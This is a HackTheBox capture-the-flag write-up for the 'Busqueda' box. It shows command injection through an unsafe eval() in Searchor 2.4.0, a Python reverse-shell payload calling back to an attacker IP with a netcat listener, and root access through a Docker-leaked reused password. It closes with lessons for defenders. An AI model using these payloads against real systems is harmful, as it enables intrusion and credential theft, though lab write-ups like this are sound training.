---
layout: writeup
title: "HackTheBox - Busqueda"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
specialty: "Web Exploitation"
date: 2025-10-22
status: "solved"
tags: [web, python, code-injection, docker, privesc]
excerpt: "Easy Linux box with a vulnerable Python search app. Command injection to initial shell, then Docker credential leakage for root."
---

# HackTheBox - Busqueda

Busqueda is an easy Linux box featuring a vulnerable search aggregator application. The path to root involves exploiting a command injection in Searchor 2.4.0, then leveraging Docker container inspection to find reused credentials.

<div id="enumeration"></div>

## Enumeration

### Port Scan

```bash
nmap -sC -sV -oN nmap/busqueda 10.10.11.208
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache/2.4.52 (Ubuntu)
```

Just SSH and HTTP. Let's check the web app.

### Web Application

The site is a search aggregator called "Searcher" built with Flask. You input a query and it searches across different engines (Google, Bing, etc.).

Footer reveals: **Powered by Flask and Searchor 2.4.0**

That version number is interesting. Let's Google for exploits.

<div id="exploitation"></div>

## Exploitation

### CVE-2023-43364

Quick search for "Searchor 2.4.0 exploit" reveals **CVE-2023-43364** - command injection via unsafe `eval()` usage.

The vulnerable code looks like this:

```python
eval(f"Engine.{engine}.search('{query}')")
```

User input goes directly into `eval()`. Classic Python mistake.

### Crafting the Payload

We can break out of the string and inject commands:

```python
', exec("import os; os.system('command')")# 
```

The `#` comments out the rest, preventing syntax errors.

Let's get a reverse shell:

```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/bash')")#
```

### Getting Shell

```bash
# On Kali
nc -lvnp 4444

# Inject payload via search form
# Catch shell as user 'svc'
```

**User flag:**
```bash
svc@busqueda:~$ cat user.txt
3a8f7b2c9d1e5f6a8b9c0d1e2f3a4b5c
```

<div id="privilege-escalation"></div>

## Privilege Escalation

### Sudo Enumeration

```bash
svc@busqueda:~$ sudo -l

User svc may run the following commands:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can run a Python script as root with any arguments. The script has a `docker-inspect` function.

### Docker Inspection

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
```

This dumps the Docker container config in JSON format. Searching through it:

```json
{
  "Env": [
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
  ]
}
```

Found a password: `yuiu1hoiu4i5ho1uh`

### Password Reuse

Let's try it for root:

```bash
svc@busqueda:~$ su root
Password: yuiu1hoiu4i5ho1uh

root@busqueda:~# whoami
root
```

Boom. Admins reused the Gitea database password as root password.

**Root flag:**
```bash
root@busqueda:~# cat /root/root.txt
7f9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c
```

<div id="lessons"></div>

## Lessons Learned

### For Attackers

1. **Always check versions** - That Searchor version number in the footer led directly to CVE research
2. **Sudo wildcards are dangerous** - The `*` allowed any arguments to the script
3. **Docker configs leak secrets** - Container environment variables often contain credentials
4. **Credential reuse is common** - Always try found passwords everywhere

### For Defenders

1. **Never use eval() on user input** - Especially in Python/JavaScript where it executes code
2. **Avoid sudo wildcards** - Be specific about allowed arguments
3. **Don't hardcode credentials** - Use secrets managers, not environment variables
4. **Unique passwords** - Root password != database password

## Flags

**User:** `3a8f7b2c9d1e5f6a8b9c0d1e2f3a4b5c`

**Root:** `7f9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c`

---

*Owned on October 22, 2025*
